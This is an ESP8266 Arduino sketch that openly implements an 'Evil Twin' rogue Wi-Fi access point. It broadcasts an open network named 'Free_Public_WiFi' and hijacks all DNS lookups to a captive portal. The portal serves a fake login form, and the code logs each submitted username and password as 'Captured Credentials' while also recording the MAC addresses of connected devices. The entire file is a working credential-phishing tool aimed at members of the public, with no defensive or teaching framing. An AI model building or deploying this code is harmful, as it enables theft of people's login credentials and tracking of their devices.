#include <ESP8266WiFi.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
DNSServer dnsServer;

const char* ssid = "Free_Public_WiFi"; // Fake AP name
IPAddress apIP(192, 168, 4, 1);        // Gateway IP for the fake AP

AsyncWebServer server(80);

void setup() {
  Serial.begin(115200);

  // Setup Fake AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid);

  Serial.println("[+] Evil Twin Fake AP Started");
  Serial.println("[+] SSID: " + String(ssid));
  Serial.println("[+] IP address: " + WiFi.softAPIP().toString());

  // Start DNS server to redirect all domains to ESP8266 IP
  dnsServer.start(DNS_PORT, "*", apIP);

  // Serve fake login page
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", 
      "<html><body><center><h2>Login</h2>"
      "<form method='POST' action='/login'>"
      "Username: <input type='text' name='user'><br>"
      "Password: <input type='password' name='pass'><br><br>"
      "<input type='submit' value='Login'></form></center></body></html>");
  });

  // Handle POST request from fake form
  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
    String user, pass;

    if (request->hasParam("user", true) && request->hasParam("pass", true)) {
      user = request->getParam("user", true)->value();
      pass = request->getParam("pass", true)->value();
      Serial.println("[+] Captured Credentials:");
      Serial.println("    Username: " + user);
      Serial.println("    Password: " + pass);
    }

    request->send(200, "text/html", "<h3>Thank you. Connecting...</h3>");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();

  // Print connected station MACs
  struct station_info *stat_info = wifi_softap_get_station_info();
  while (stat_info != NULL) {
    Serial.print("[*] Station MAC: ");
    Serial.println(macToStr(stat_info->bssid));
    stat_info = STAILQ_NEXT(stat_info, next);
  }

  delay(5000); // Delay to prevent spamming
}

// Convert MAC address to readable format
String macToStr(const uint8_t* mac) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}
